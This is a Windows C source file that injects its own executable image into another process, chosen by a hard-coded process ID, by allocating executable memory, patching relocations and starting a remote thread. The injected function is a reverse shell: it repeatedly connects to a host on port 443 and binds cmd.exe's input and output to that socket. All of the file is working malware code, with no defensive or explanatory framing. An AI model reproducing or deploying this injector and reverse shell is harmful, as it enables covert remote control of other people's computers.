#include <windows.h>
#include <winsock.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
DWORD WINAPI RemoteFunction(LPVOID unused)
{
	WSADATA wsa;
struct sockaddr_in cliente;
struct sockaddr_in *ptr;
SOCKET s;
ptr=&cliente;
cliente.sin_addr.s_addr=inet_addr("127.0.0.1");
cliente.sin_family=AF_INET;
cliente.sin_port=htons(443);
if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
    //printf("erro wsastartup \n");

}
s=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
while(2){
        Sleep(5000);
    if(connect(s,ptr,sizeof cliente)==0){
        //printf(" conexao aceita \n");
        break;
    }
else{
    printf("tentando se conectar \n");
}
}
STARTUPINFO sti;
PROCESS_INFORMATION psi;
memset(&sti,0,sizeof(sti));
memset(&psi,0,sizeof(psi));
sti.cb=sizeof(STARTUPINFO);
sti.dwFlags=(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
sti.hStdError=(HANDLE)s;
sti.hStdInput=(HANDLE)s;
sti.hStdOutput=(HANDLE)s;
char process[]="cmd.exe";
CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL,	NULL, &sti, &psi);
WaitForSingleObject(psi.hProcess, INFINITE);

	return 0;
}

int main()
{
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_DATA_DIRECTORY pIDD;
	PIMAGE_BASE_RELOCATION pIBR;

	HMODULE hModule;
	HANDLE hProcess, hThread;
	PVOID image, mem;
	DWORD i, count;
	DWORD_PTR delta, OldDelta;
	LPWORD list;
	PDWORD_PTR p;



	DWORD dwPid=6616;



	hModule = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)hModule;
	pINH = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pIDH->e_lfanew);

	printf("Opening target process...\n");

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess)
	{
		printf("Error: Unable to open target process handle.\n");
		return 1;
	}
	printf("Allocating memory in the target process...\n");

	mem = VirtualAllocEx(hProcess, NULL, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (mem == NULL)
	{
		//printf("Error: Unable to allocate memory in the target process. %d\n", GetLastError());
		CloseHandle(hProcess);
		return 1;
	}

	printf("Memory allocated. Address: %#010x\n", mem);

	image = VirtualAlloc(NULL, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	memcpy(image, hModule, pINH->OptionalHeader.SizeOfImage);

	//Reloc
	pIDD = &pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)image + pIDD->VirtualAddress);

	delta = (DWORD_PTR)((LPBYTE)mem - pINH->OptionalHeader.ImageBase);
	OldDelta = (DWORD_PTR)((LPBYTE)hModule - pINH->OptionalHeader.ImageBase);

	while (pIBR->VirtualAddress != 0)
	{
		if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
		{
			count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			list = (LPWORD)((LPBYTE)pIBR + sizeof(IMAGE_BASE_RELOCATION));

			for (i = 0; i < count; i++)
			{
				if (list[i] > 0)
				{
					p = (PDWORD_PTR)((LPBYTE)image + (pIBR->VirtualAddress + (0x0fff & (list[i]))));

					*p -= OldDelta;
					*p += delta;
				}
			}
		}

		pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
		break;
	}

	printf("Writing executable image into target process...\n");
	DWORD n;
	if (!WriteProcessMemory(hProcess, mem, image, pINH->OptionalHeader.SizeOfImage, &n))
	{
		//printf("Error: Unable to write executable image into target process\n");
		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		VirtualFree(mem, 0, MEM_RELEASE);
		return 1;
	}

	printf("Creating remote thread in target process...\n");
	LPTHREAD_START_ROUTINE remoteThread = (LPTHREAD_START_ROUTINE)((LPBYTE)mem + (DWORD_PTR)(LPBYTE)RemoteFunction - (LPBYTE)hModule);

	hThread = CreateRemoteThread(hProcess, NULL, 0, remoteThread, NULL, 0, NULL);
	if (!hThread)
	{
		printf("Error: Unable to create remote thread in target process.\n");
		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		VirtualFree(image, 0, MEM_RELEASE);
		return 1;
	}

	printf("Thread successfully created! Waiting for the thread to terminate...\n");
	WaitForSingleObject(hThread, INFINITE);

	printf("Thread terminated!\n");
	CloseHandle(hThread);

	printf("Freeing allocated memory...\n");

	VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
	CloseHandle(hProcess);
	VirtualFree(image, 0, MEM_RELEASE);
	return 0;
}
